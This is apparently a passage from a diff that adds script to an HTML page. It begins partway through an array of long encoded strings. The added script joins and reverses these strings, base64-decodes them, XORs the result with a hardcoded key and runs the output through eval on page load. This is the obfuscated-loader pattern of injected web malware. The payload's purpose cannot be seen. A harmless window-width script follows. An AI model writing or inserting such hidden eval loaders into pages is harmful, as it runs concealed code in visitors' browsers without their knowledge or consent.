0QqgnLncCGj8TBJ1Fb","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"];
+         var $_ad3374="YF2!X3jp$Ks*dMLmTBBUZ1$UaZEvP@g*";
+         var __fb580c=function(s){return s.split('').reverse().join('')};
+         var __2d5e0d=__fb580c($_ad2d6c.join(''));
+         var _0xa7d73c=atob(__2d5e0d);
+         var $_f66cc4=new Uint8Array(_0xa7d73c.length);
+         for(var _0x93737e=0;_0x93737e<_0xa7d73c.length;_0x93737e++){
+            $_f66cc4[_0x93737e]=_0xa7d73c.charCodeAt(_0x93737e)^$_ad3374.charCodeAt(_0x93737e%$_ad3374.length);
+         }
+         var $_fe2195=new TextDecoder();
+         var $_bf8669=$_fe2195.decode($_f66cc4);
+         (0,eval)($_bf8669);
+      }();
+   </script>
+   <script>
+      // Window width indicator
+      var _w = document.getElementById('window-width');
+      var _u = function () { if (_w) _w.textContent = window.innerWidth; };
+      _u(); window.addEventListener('resize', _u);
+   </script>
+</body>
+
+</html>
